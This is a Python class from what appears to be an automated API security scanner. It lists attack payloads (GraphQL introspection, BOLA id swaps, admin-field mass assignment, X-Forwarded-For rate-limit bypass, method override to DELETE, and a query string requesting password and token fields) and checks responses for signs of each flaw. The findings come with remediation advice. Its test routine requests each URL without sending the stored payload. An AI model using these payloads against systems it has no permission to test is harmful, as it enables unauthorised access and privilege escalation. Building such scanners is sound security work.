class APISecurityAgent(SwarmAgent):
    """API security specialist — GraphQL, BOLA, mass assignment, rate limits."""

    RELEVANT_NODE_TYPES    = ["api_endpoint", "url"]
    RELEVANT_LABEL_KEYWORDS = ["api", "graphql", "rest", "v1", "v2", "v3", "endpoint"]

    _ATTACK_PAYLOADS: Dict[str, str] = {
        "graphql_introspection": '{"query":"{__schema{queryType{name}}}"}',
        "bola":                  '{"user_id": 2}',
        "mass_assignment":       '{"role":"admin","is_admin":true,"admin":true}',
        "rate_limit_bypass":     "X-Forwarded-For: 127.0.0.1",
        "version_bypass":        "/api/v0/",
        "method_override":       "X-HTTP-Method-Override: DELETE",
        "api_key_disclosure":    "/api/debug/config",
        "excessive_data":        "?fields=*&expand=all&include=password,token",
    }

    def __init__(self, **kwargs):
        super().__init__(AgentType.API, **kwargs)

    async def generate_hypotheses(self, target, graph_nodes, context) -> List[Hypothesis]:
        hypotheses: List[Hypothesis] = []
        api_eps = context.get("api_endpoints", context.get("endpoints", [target]))

        for ep in api_eps[:20]:
            for attack, payload in self._ATTACK_PAYLOADS.items():
                if attack == "graphql_introspection" and "graphql" not in ep.lower():
                    continue
                hypotheses.append(Hypothesis(
                    hypothesis_id = uuid.uuid4().hex[:8],
                    agent_type    = self.agent_type,
                    target_node   = ep,
                    attack_vector = attack,
                    confidence    = self.memory.rate(attack, 0.38),
                    payload       = payload,
                    context       = {"endpoint": ep, "attack": attack},
                    reasoning     = f"API endpoint may be vulnerable to {attack}",
                    priority      = self.memory.rate(attack, 0.38),
                ))

        hypotheses.sort(key=lambda h: h.priority, reverse=True)
        return hypotheses[:40]

    async def execute_tests(self, target, hypotheses, context) -> List[AgentFinding]:
        findings: List[AgentFinding] = []

        for h in hypotheses:
            if self._stop_event.is_set():
                break
            try:
                result = await self._tool("httpx", url=h.target_node)
                data   = result.get("data") or {}
                status = data.get("status", 0) if isinstance(data, dict) else 0
                body   = str(data.get("body", "") if isinstance(data, dict) else data)

                if h.attack_vector == "graphql_introspection" and "__schema" in body:
                    findings.append(self._finding(
                        target         = h.target_node,
                        vuln_type      = "graphql_introspection",
                        severity       = "medium",
                        title          = "GraphQL Introspection Enabled",
                        description    = "Full API schema exposed via introspection query.",
                        payload        = h.payload,
                        evidence       = body[:400],
                        cvss           = 5.3,
                        confidence     = 0.95,
                        reproduced     = True,
                        chain_potential= ["graphql_to_bola", "graphql_schema_harvest"],
                        remediation    = "Disable introspection in production; use field-level authorization.",
                    ))
                elif h.attack_vector == "bola" and status == 200:
                    if any(k in body for k in ['"user_id"', '"email"', '"role"', '"password"']):
                        findings.append(self._finding(
                            target         = h.target_node,
                            vuln_type      = "bola",
                            severity       = "high",
                            title          = "BOLA — Broken Object Level Authorization",
                            description    = "API returns another object's data without ownership check.",
                            payload        = h.payload,
                            evidence       = body[:500],
                            cvss           = 8.1,
                            confidence     = 0.80,
                            reproduced     = True,
                            chain_potential= ["bola_to_data_breach"],
                            remediation    = "Add per-object ownership validation in every API handler.",
                        ))
                elif h.attack_vector == "mass_assignment" and status in [200, 201]:
                    if any(k in body for k in ['"admin":true', '"role":"admin"', '"is_admin":true']):
                        findings.append(self._finding(
                            target         = h.target_node,
                            vuln_type      = "mass_assignment",
                            severity       = "high",
                            title          = "Mass Assignment — Privilege Field Writeable",
                            description    = "API allows assigning privileged fields (role/admin) via request body.",
                            payload        = h.payload,
                            evidence       = body[:400],
                            cvss           = 8.8,
                            confidence     = 0.85,
                            reproduced     = True,
                            chain_potential= ["mass_assignment_to_privilege_escalation"],
                            remediation    = "Use explicit allowlists for API request body fields.",
                        ))
            except Exception as exc:
                logger.debug("[%s] API test error: %s", self.name, exc)
            await asyncio.sleep(0.05)

        return findings


